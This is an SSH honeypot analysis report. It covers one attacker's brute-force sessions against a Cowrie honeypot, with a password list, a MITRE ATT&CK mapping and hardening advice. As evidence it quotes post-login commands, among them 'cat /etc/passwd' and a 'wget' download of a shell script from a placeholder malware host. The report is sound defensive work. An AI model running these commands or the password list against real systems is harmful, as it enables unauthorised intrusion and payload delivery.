# Attack Summary — SSH Honeypot Analysis

## Overview

A Cowrie SSH honeypot was deployed on AWS EC2 (EU-North-1, Stockholm) on port 2222 and exposed to the public internet. This document summarizes the attack sessions captured during the observation period.

---

## Session Statistics

| Metric | Value |
|--------|-------|
| Total Sessions Captured | 16 |
| Observation Period | 2026-03-15 15:01 UTC — 2026-03-15 15:35 UTC |
| Target Port | 2222 (SSH Honeypot) |
| Attacker IP | 223.237.190.129 |
| Targeted Username | root (100% of attempts) |
| Unique Passwords Tried | 16 |
| Commands Executed | 4 (Session 1 only) |

---

## Attacker Behavior Pattern

### Phase 1 — Initial Access (Session 1)
The attacker gained entry using `root/admin123` and immediately began post-exploitation reconnaissance:

```
whoami           → Privilege check
cat /etc/passwd  → User enumeration
uname -a         → System fingerprinting
wget http://malware.com/evil.sh  → Malware download attempt (failed)
```

Session duration: **295.2 seconds**

### Phase 2 — Brute Force Loop (Sessions 2–16)
Subsequent sessions used a rapid automated brute force pattern — each session connected, authenticated with a new password, and disconnected within 2–15 seconds.

Average session duration: **~4 seconds**

---

## Password Analysis

| # | Password | Pattern |
|---|----------|---------|
| 1 | admin123 | Common admin default |
| 2 | hello123 | Dictionary + numbers |
| 3 | admin 123 | Space variant |
| 4 | password123455 | Common base + numbers |
| 5 | pswwrd | Typo variant |
| 6 | 1234556789 | Numeric sequence |
| 7 | hellopass | Dictionary combo |
| 8 | pasas | Short weak password |
| 9 | root123 | Username + numbers |
| 10 | fastcrack3455 | Custom wordlist entry |
| 11 | required | Single dictionary word |
| 12 | debian123 | OS name + numbers |
| 13 | user123 | Generic user + numbers |
| 14 | User123 | Case variant |
| 15 | Rootuser | Username reverse combo |
| 16 | rootuser | Lowercase variant |

**Key observation:** All passwords follow predictable patterns — dictionary words, OS/service names, and simple number suffixes. This is consistent with automated credential stuffing tools.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Initial Access | Brute Force: Password Spraying | T1110.003 | 16 password attempts against root |
| Discovery | System Information Discovery | T1082 | `uname -a` executed post-login |
| Discovery | Account Discovery: Local Account | T1087.001 | `cat /etc/passwd` executed |
| Privilege Escalation | Valid Accounts: Local Accounts | T1078.003 | Logged in as root directly |
| Command & Control | Ingress Tool Transfer | T1105 | `wget` malware download attempted |

---

## Key Findings

1. **Root is always the target** — 100% of login attempts used `root` as the username. Default SSH root login should always be disabled in production.

2. **Automated tooling evident** — Session 2–16 show rapid-fire connections with 2–4 second intervals, consistent with automated brute force scripts.

3. **Weak password wordlists used** — Passwords like `admin123`, `root123`, `debian123` are found in common credential stuffing wordlists (e.g., RockYou, SecLists).

4. **Immediate post-exploitation** — Within 90 seconds of login, attacker ran 4 commands covering privilege check, user enumeration, system fingerprinting, and payload delivery.

5. **Malware delivery blocked** — `wget http://malware.com/evil.sh` failed due to DNS resolution failure in the sandbox environment — Cowrie's isolation worked as intended.

6. **Cowrie deception successful** — Attacker interacted with the fake Debian shell (`svr04`) for 295 seconds without detecting the honeypot.

---

## Defensive Recommendations

| Finding | Recommendation |
|---------|---------------|
| Root brute force | Disable root SSH login (`PermitRootLogin no`) |
| Weak passwords | Enforce strong password policy / use SSH keys only |
| Automated scanning | Implement fail2ban or rate limiting on SSH |
| Malware download | Block outbound wget/curl to unknown domains |
| Reconnaissance | Monitor for rapid sequential commands post-login |
